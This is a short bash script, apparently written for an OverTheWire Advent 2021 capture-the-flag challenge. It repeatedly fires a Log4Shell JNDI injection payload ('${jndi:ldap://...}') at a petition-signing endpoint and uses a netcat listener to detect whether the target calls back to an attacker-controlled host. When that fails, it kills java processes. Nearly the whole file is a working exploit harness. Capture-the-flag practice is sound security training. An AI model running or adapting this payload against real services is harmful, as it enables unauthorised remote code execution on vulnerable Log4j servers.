#!/bin/bash

ip=10.0.0.67
port=12345
wtime=2

watchdog() {
        # setup a listener
        nc -W1 -nl $port &> /dev/null &
        listener=$!
        echo "-- Listener has PID $listener"
        # trigger the exploit
        echo "-- trigger exploit"
        timeout 2 curl http://grinch-petition.advent2021.overthewire.org:1214/signPetition -d "name=x&message=x&recipient=\${jndi:ldap://$ip:$port/xxxxxxx}" &> /dev/null

        echo "-- sleep $wtime seconds"
        sleep $wtime

        # if there was a connection, the listener PID is gone
        if ps -p $listener &> /dev/null; then
                echo "FAILED exploit didn't work"
                echo xxx | nc $ip $port
                pkill -9 java
        else
                echo "-- exploit worked"
        fi
}


while true;
do
        echo -n "=========== running watchdog at "
        date
        watchdog
        sleep 10
done
